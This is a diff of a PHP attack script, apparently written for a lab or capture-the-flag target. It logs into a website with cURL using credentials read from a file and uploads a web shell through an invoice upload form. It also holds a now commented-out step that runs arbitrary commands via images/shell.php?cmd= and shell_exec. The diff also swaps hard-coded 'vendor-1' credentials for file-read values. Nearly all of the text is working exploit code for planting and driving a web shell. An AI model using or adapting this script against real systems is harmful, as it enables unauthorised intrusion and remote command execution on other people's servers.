@@ -2,12 +2,6 @@
 /*
  * Code Source: http://thisinterestsme.com/php-login-to-website-with-curl/
  */
-
-//The username or email address of the account.
-define('USERNAME', 'vendor-1');
- 
-//The password of the account.
-define('PASSWORD', 'vendor-1');
  
 //Set a user agent. This basically tells the server that we are using Chrome ;)
 define('USER_AGENT', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36');
@@ -31,6 +25,11 @@ $username = fgets($myfile);
 $password = fgets($myfile);
 fclose($myfile);
 
+//The username or email address of the account.
+define('USERNAME', $username);
+//The password of the account.
+define('PASSWORD', $password);
+
 //Upload file
 $shellPath = $argv[3];
 
@@ -46,7 +45,7 @@ $shellValues = array(
     'invoice' => '@'.realpath($shellPath)
 );
 
-echo "Username: contractor\tPassword: password\n";
+echo "Username:", $username, "Password:", $password, "\n";
 
 //Initiate cURL.
 $curl = curl_init();
@@ -119,10 +118,11 @@ if(curl_errno($curl)){
 	echo "Success of uploading shell file!\n";
 }
 
+// Run shell command
 
-$cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
-$shellcmd = $argv[3];
+// $cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
+// $shellcmd = $argv[4];
 
-echo shell_exec ($cmd.$shellcmd);
+// echo shell_exec ($cmd.$shellcmd);
 
 curl_close($curl);
